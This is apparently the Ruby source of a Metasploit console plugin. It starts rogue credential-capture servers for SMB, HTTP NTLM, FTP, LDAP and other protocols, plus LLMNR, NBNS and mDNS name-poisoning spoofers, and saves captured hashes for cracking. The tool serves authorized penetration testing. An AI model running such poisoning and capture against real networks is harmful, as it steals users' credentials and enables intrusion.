require 'uri'
require 'rex/sync/event'
require 'fileutils'

module Msf
  #
  # Combines several Metasploit modules related to spoofing names and capturing credentials
  # into one plugin
  #
  class Plugin::Capture < Msf::Plugin

    class ConsoleCommandDispatcher
      include Msf::Ui::Console::CommandDispatcher

      class CaptureJobListener
        def initialize(name, done_event, dispatcher)
          @name = name
          @done_event = done_event
          @dispatcher = dispatcher
        end

        def waiting(_id)
          self.succeeded = true
          @dispatcher.print_good("#{@name} started")
          @done_event.set
        end

        def start(id); end

        def completed(id, result, mod); end

        def failed(_id, _error, _mod)
          @dispatcher.print_error("#{@name} failed to start")
          @done_event.set
        end

        attr_accessor :succeeded

      end

      HELP_REGEX = /^-?-h(?:elp)?$/.freeze

      def initialize(*args)
        super(*args)
        @active_job_ids = {}
        @active_loggers = {}
        @stop_opt_parser = Rex::Parser::Arguments.new(
          '--session' => [ true, 'Session to stop (otherwise all capture jobs on all sessions will be stopped)' ],
          ['-h', '--help'] => [ false, 'Display this message' ]
        )

        @start_opt_parser = Rex::Parser::Arguments.new(
          '--session' => [ true, 'Session to bind on' ],
          ['-i', '--ip'] => [ true, 'IP to bind to' ],
          '--spoofip' => [ true, 'IP to use for spoofing (poisoning); default is the bound IP address' ],
          '--regex' => [ true, 'Regex to match for spoofing' ],
          ['-b', '--basic'] => [ false, 'Use Basic auth for HTTP listener (default is NTLM)' ],
          '--cert' => [ true, 'Path to SSL cert for encrypted communication' ],
          '--configfile' => [ true, 'Path to a config file' ],
          '--logfile' => [ true, 'Path to store logs' ],
          '--hashdir' => [ true, 'Directory to store hash results' ],
          '--stdout' => [ false, 'Show results in stdout' ],
          ['-v', '--verbose'] => [ false, 'Verbose output' ],
          ['-h', '--help'] => [ false, 'Display this message' ]
        )
      end

      def name
        'HashCapture'
      end

      def commands
        {
          'captureg' => 'Start credential capturing services'
        }
      end

      # The main handler for the request command.
      #
      # @param args [Array<String>] The array of arguments provided by the user.
      # @return [nil]
      def cmd_captureg(*args)
        # short circuit the whole deal if they need help
        return help if args.empty?
        return help if args.length == 1 && args.first =~ HELP_REGEX
        return help(args.last) if args.length == 2 && args.first =~ HELP_REGEX

        begin
          if args.first == 'stop'
            listeners_stop(args)
            return
          end

          if args.first == 'start'
            listeners_start(args)
            return
          end
          return help
        rescue ArgumentError => e
          print_error(e.message)
        end
      end

      def tab_complete_start(str, words)
        last_word = words[-1]
        case last_word
        when '--session'
          return framework.sessions.keys.map(&:to_s)
        when '--cert', '--configfile', '--logfile'
          return tab_complete_filenames(str, words)
        when '--hashdir'
          return tab_complete_directory(str, words)
        when '-i', '--ip', '--spoofip'
          return tab_complete_source_address

        end

        if @start_opt_parser.arg_required?(last_word)
          # The previous word needs an argument; we can't provide any help
          return []
        end

        # Otherwise, we are expecting another flag next
        result = @start_opt_parser.option_keys.select { |opt| opt.start_with?(str) }
        return result
      end

      def tab_complete_stop(str, words)
        last_word = words[-1]
        case last_word
        when '--session'
          return framework.sessions.keys.map(&:to_s) + ['local']
        end
        if @stop_opt_parser.arg_required?(words[-1])
          # The previous word needs an argument; we can't provide any help
          return []
        end

        @stop_opt_parser.option_keys.select { |opt| opt.start_with?(str) }
      end

      def cmd_captureg_tabs(str, words)
        return ['start', 'stop'] if words.length == 1

        if words[1] == 'start'
          tab_complete_start(str, words)
        elsif words[1] == 'stop'
          tab_complete_stop(str, words)
        end
      end

      def listeners_start(args)
        config = parse_start_args(args)
        if config[:show_help]
          help('start')
          return
        end

        # Make sure there is no capture happening on that session already
        session = config[:session]
        if session.nil?
          session = 'local'
        end

        if @active_job_ids.key?(session)
          active_jobs = @active_job_ids[session]

          # If there are active job IDs on this session, we should fail: there's already a capture going on.
          # Make them stop it first.
          # The exception is if all jobs have been manually terminated, then let's treat it
          # as if the capture was stopped, and allow starting now.
          active_jobs.each do |job_id|
            next unless framework.jobs.key?(job_id.to_s)

            session_str = ''
            unless session.nil?
              session_str = ' on this session'
            end
            print_error("A capture is already in progress#{session_str}. Stop the existing capture then restart a new one")
            return
          end
        end

        if @active_loggers.key?(session)
          logger = @active_loggers[session]
          logger.close
        end

        # Start afresh
        @active_job_ids[session] = []
        @active_loggers.delete(session)

        transform_params(config)
        validate_params(config)

        modules = {
          # Capturing
          'DRDA' => 'auxiliary/server/capture/drda',
          'FTP' => 'auxiliary/server/capture/ftp',
          'IMAP' => 'auxiliary/server/capture/imap',
          'LDAP' => 'auxiliary/server/capture/ldap',
          'MSSQL' => 'auxiliary/server/capture/mssql',
          'MySQL' => 'auxiliary/server/capture/mysql',
          'POP3' => 'auxiliary/server/capture/pop3',
          'Postgres' => 'auxiliary/server/capture/postgresql',
          'PrintJob' => 'auxiliary/server/capture/printjob_capture',
          'SIP' => 'auxiliary/server/capture/sip',
          'SMB' => 'auxiliary/server/capture/smb',
          'SMTP' => 'auxiliary/server/capture/smtp',
          'Telnet' => 'auxiliary/server/capture/telnet',
          'VNC' => 'auxiliary/server/capture/vnc',

          # SSL versions
          'FTPS' => 'auxiliary/server/capture/ftp',
          'IMAPS' => 'auxiliary/server/capture/imap',
          'POP3S' => 'auxiliary/server/capture/pop3',
          'SMTPS' => 'auxiliary/server/capture/smtp',

          # Poisoning
          # 'DNS' => 'auxiliary/spoof/dns/native_spoofer',
          'NBNS' => 'auxiliary/spoof/nbns/nbns_response',
          'LLMNR' => 'auxiliary/spoof/llmnr/llmnr_response',
          'mDNS' => 'auxiliary/spoof/mdns/mdns_response'
          # 'WPAD' => 'auxiliary/server/wpad',
        }

        encrypted = ['HTTPS_NTLM', 'HTTPS_Basic', 'FTPS', 'IMAPS', 'POP3S', 'SMTPS']

        if config[:http_basic]
          modules['HTTP'] = 'auxiliary/server/capture/http_basic'
          modules['HTTPS'] = 'auxiliary/server/capture/http_basic'
        else
          modules['HTTP'] = 'auxiliary/server/capture/http_ntlm'
          modules['HTTPS'] = 'auxiliary/server/capture/http_ntlm'
        end

        modules_to_run = []
        logfile = config[:logfile]
        print_line("Logging results to #{logfile}")
        logdir = ::File.dirname(logfile)
        FileUtils.mkdir_p(logdir)
        hashdir = config[:hashdir]
        print_line("Hash results stored in #{hashdir}")
        FileUtils.mkdir_p(hashdir)

        if config[:stdout]
          logger = Rex::Ui::Text::Output::Tee.new(logfile)
        else
          logger = Rex::Ui::Text::Output::File.new(logfile, 'ab')
        end

        @active_loggers[session] = logger

        config[:services].each do |service|
          svc = service['type']
          unless service['enabled']
            # This service turned off in config
            next
          end

          module_name = modules[svc]
          if module_name.nil?
            print_error("Unknown service: #{svc}")
            return
          end

          # Special case for two variants of HTTP
          if svc.start_with?('HTTP')
            if config[:http_basic]
              svc += '_Basic'
            else
              svc += '_NTLM'
            end
          end

          mod = framework.modules.create(module_name)
          # Bail if we couldn't
          unless mod
            # Error: this should exist
            load_error = framework.modules.load_error_by_name(module_name)
            if load_error
              print_error("Failed to load #{module_name}: #{load_error}")
            else
              print_error("Failed to load #{module_name}")
            end
            return
          end

          datastore = {}
          # Capturers
          datastore['SRVHOST'] = config[:srvhost]
          datastore['CAINPWFILE'] = File.join(config[:hashdir], "cain_#{svc}")
          datastore['JOHNPWFILE'] = File.join(config[:hashdir], "john_#{svc}")

          # Poisoners
          datastore['SPOOFIP'] = config[:spoof_ip]
          datastore['SPOOFIP4'] = config[:spoof_ip]
          datastore['REGEX'] = config[:spoof_regex]
          datastore['ListenerComm'] = config[:session]

          opts = {}
          opts['Options'] = datastore
          opts['RunAsJob'] = true
          opts['LocalOutput'] = logger
          if config[:verbose]
            datastore['VERBOSE'] = true
          end

          method = "configure_#{svc.downcase}"
          if respond_to?(method)
            send(method, datastore, config)
          end

          if encrypted.include?(svc)
            configure_tls(datastore, config)
          end

          # Before running everything, let's do some basic validation of settings
          mod_dup = mod.replicant
          mod_dup._import_extra_options(opts)
          mod_dup.options.validate(mod_dup.datastore)

          modules_to_run.append([svc, mod, opts])
        end

        modules_to_run.each do |svc, mod, opts|
          event = Rex::Sync::Event.new(false, false)
          job_listener = CaptureJobListener.new(mod.name, event, self)

          result = Msf::Simple::Auxiliary.run_simple(mod, opts, job_listener: job_listener)
          job_id = result[1]

          # Wait for the event to trigger (socket server either waiting, or failed)
          event.wait
          next unless job_listener.succeeded

          # Keep track of it so we can close it upon a `stop` command
          @active_job_ids[session].append(job_id)
          job = framework.jobs[job_id.to_s]
          # Rename the job for display (to differentiate between the encrypted/plaintext ones in particular)
          if config[:session].nil?
            session_str = 'local'
          else
            session_str = "session #{config[:session].to_i}"
          end
          job.send(:name=, "Capture (#{session_str}): #{svc}")
        end

        print_good('Started capture jobs')
      end

      def listeners_stop(args)
        options = parse_stop_args(args)
        if options[:show_help]
          help('stop')
          return
        end

        session = options[:session]
        job_id_clone = @active_job_ids.clone
        job_id_clone.each do |session_id, jobs|
          next unless session.nil? || session == session_id

          jobs.each do |job_id|
            framework.jobs.stop_job(job_id) unless framework.jobs[job_id.to_s].nil?
          end
          jobs.clear
          @active_job_ids.delete(session_id)
        end

        loggers_clone = @active_loggers.clone
        loggers_clone.each do |session_id, logger|
          if session.nil? || session == session_id
            logger.close
            @active_loggers.delete(session_id)
          end
        end

        print_line('Capture listeners stopped')
      end

      # Print the appropriate help text depending on an optional option parser.
      #
      # @param first_arg [String] the first argument to this command
      # @return [nil]
      def help(first_arg = nil)
        if first_arg == 'start'
          print_line('Usage: captureg start -i <ip> [options]')
          print_line(@start_opt_parser.usage)
        elsif first_arg == 'stop'
          print_line('Usage: captureg stop [options]')
          print_line(@stop_opt_parser.usage)
        else
          print_line('Usage: captureg [start|stop] [options]')
          print_line('')
          print_line('Use captureg --help [start|stop] for more detailed usage help')
        end
      end

      def default_options
        {
          ntlm_challenge: nil,
          ntlm_domain: nil,
          services: {},
          spoof_ip: nil,
          spoof_regex: '.*',
          srvhost: nil,
          http_basic: false,
          session: nil,
          ssl_cert: nil,
          verbose: false,
          show_help: false,
          stdout: false,
          logfile: nil,
          hashdir: nil
        }
      end

      def default_logfile(options)
        session = 'local'
        session = options[:session].to_s unless options[:session].nil?

        name = "capture_#{session}_#{Time.now.strftime('%Y%m%d%H%M%S')}_#{Rex::Text.rand_text_numeric(6)}.txt"
        File.join(Msf::Config.log_directory, "captures/#{name}")
      end

      def default_hashdir(options)
        session = 'local'
        session = options[:session].to_s unless options[:session].nil?

        name = "capture_#{session}_#{Time.now.strftime('%Y%m%d%H%M%S')}_#{Rex::Text.rand_text_numeric(6)}"
        File.join(Msf::Config.loot_directory, "captures/#{name}")
      end

      def read_config(filename)
        options = {}
        File.open(filename, 'rb') do |f|
          yamlconf = YAML.safe_load(f)
          options = {
            ntlm_challenge: yamlconf['ntlm_challenge'],
            ntlm_domain: yamlconf['ntlm_domain'],
            services: yamlconf['services'],
            spoof_regex: yamlconf['spoof_regex'],
            http_basic: yamlconf['http_basic'],
            ssl_cert: yamlconf['ssl_cert'],
            logfile: yamlconf['logfile'],
            hashdir: yamlconf['hashdir']
          }
        end
      end

      def parse_stop_args(args)
        options = {
          session: nil,
          show_help: false
        }

        @start_opt_parser.parse(args) do |opt, _idx, val|
          case opt
          when '--session'
            options[:session] = val
          when '-h'
            options[:show_help] = true
          end
        end

        options
      end

      def parse_start_args(args)
        config_file = File.join(Msf::Config.config_directory, 'capture_config.yaml')
        # See if there was a config file set
        @start_opt_parser.parse(args) do |opt, _idx, val|
          case opt
          when '--configfile'
            config_file = val
          end
        end

        options = default_options
        config_options = read_config(config_file)
        options = options.merge(config_options)

        @start_opt_parser.parse(args) do |opt, _idx, val|
          case opt
          when '--session'
            options[:session] = val
          when '-i', '--ip'
            options[:srvhost] = val
          when '--spoofip'
            options[:spoof_ip] = val
          when '--regex'
            options[:spoof_regex] = val
          when '-v', '--verbose'
            options[:verbose] = true
          when '--basic', '-b'
            options[:http_basic] = true
          when '--cert'
            options[:ssl_cert] = val
          when '--stdout'
            options[:stdout] = true
          when '--logfile'
            options[:logfile] = val
          when '--hashdir'
            options[:hashdir] = val
          when '-h', '--help'
            options[:show_help] = true
          end
        end

        options
      end

      def poison_included(options)
        poisoners = ['mDNS', 'LLMNR', 'NBNS']
        options[:services].each do |svc|
          if svc['enabled'] && poisoners.member?(svc['type'])
            return true
          end
        end
        false
      end

      # Fill in implied parameters to make the running code neater
      def transform_params(options)
        # If we've been given a specific IP to listen on, use that as our poisoning IP
        if options[:spoof_ip].nil? && Rex::Socket.is_ip_addr?(options[:srvhost]) && Rex::Socket.addr_atoi(options[:srvhost]) != 0
          options[:spoof_ip] = options[:srvhost]
        end

        unless options[:session].nil?
          options[:session] = framework.sessions.get(options[:session])&.sid
          # UDP is not supported on remote sessions
          udp = ['NBNS', 'LLMNR', 'mDNS', 'SIP']
          options[:services].each do |svc|
            if svc['enabled'] && udp.member?(svc['type'])
              print_line("Skipping #{svc['type']}: UDP server not supported over a remote session")
              svc['enabled'] = false
            end
          end
        end

        if options[:logfile].nil?
          options[:logfile] = default_logfile(options)
        end

        if options[:hashdir].nil?
          options[:hashdir] = default_hashdir(options)
        end
      end

      def validate_params(options)
        unless options[:srvhost] && Rex::Socket.is_ip_addr?(options[:srvhost])
          raise ArgumentError, 'Must provide a valid IP address to listen on'
        end
        # If we're running poisoning (which is disabled remotely, so excluding that situation),
        # we need either a specific srvhost to use, or a specific spoof IP
        if options[:spoof_ip].nil? && poison_included(options)
          raise ArgumentError, 'Must provide a specific IP address to use for poisoning'
        end
        unless Rex::Socket.is_ip_addr?(options[:spoof_ip])
          raise ArgumentError, 'Spoof IP must be a valid IP address'
        end
        unless options[:ssl_cert].nil? || File.file?(options[:ssl_cert])
          raise ArgumentError, "File #{options[:ssl_cert]} not found"
        end
        unless options[:session].nil? || framework.sessions.get(options[:session])
          raise ArgumentError, "Session #{options[:session].to_i} not found"
        end
      end

      def configure_tls(datastore, config)
        datastore['SSL'] = true
        datastore['SSLCert'] = config[:ssl_cert]
      end

      def configure_smb(datastore, config)
        datastore['SMBDOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
      end

      def configure_ldap(datastore, config)
        datastore['DOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
      end

      def configure_mssql(datastore, config)
        datastore['DOMAIN_NAME'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
      end

      def configure_http_ntlm(datastore, config)
        datastore['DOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
        datastore['SRVPORT'] = 80
        datastore['URIPATH'] = '/'
      end

      def configure_http_basic(datastore, _config)
        datastore['URIPATH'] = '/'
      end

      def configure_https_basic(datastore, _config)
        datastore['SRVPORT'] = 443
        datastore['URIPATH'] = '/'
      end

      def configure_https_ntlm(datastore, config)
        datastore['DOMAIN'] = config[:ntlm_domain]
        datastore['CHALLENGE'] = config[:ntlm_challenge]
        datastore['SRVPORT'] = 443
        datastore['URIPATH'] = '/'
      end

      def configure_ftps(datastore, _config)
        datastore['SRVPORT'] = 990
      end

      def configure_imaps(datastore, _config)
        datastore['SRVPORT'] = 993
      end

      def configure_pop3s(datastore, _config)
        datastore['SRVPORT'] = 995
      end

      def configure_smtps(datastore, _config)
        datastore['SRVPORT'] = 587
      end
    end

    def initialize(framework, opts)
      super
      add_console_dispatcher(ConsoleCommandDispatcher)
      filename = 'capture_config.yaml'
      user_config_file = File.join(Msf::Config.config_directory, filename)
      unless File.exist?(user_config_file)
        # Initialise user config file with the installed one
        base_config_file = File.join(Msf::Config.data_directory, filename)
        unless File.exist?(base_config_file)
          print_error('Plugin config file not found!')
          return
        end
        FileUtils.cp(base_config_file, user_config_file)
      end
    end

    def cleanup
      remove_console_dispatcher('HashCapture')
    end

    def name
      'Credential Capture'
    end

    def desc
      'Start all credential capture and spoofing services'
    end

  end
end
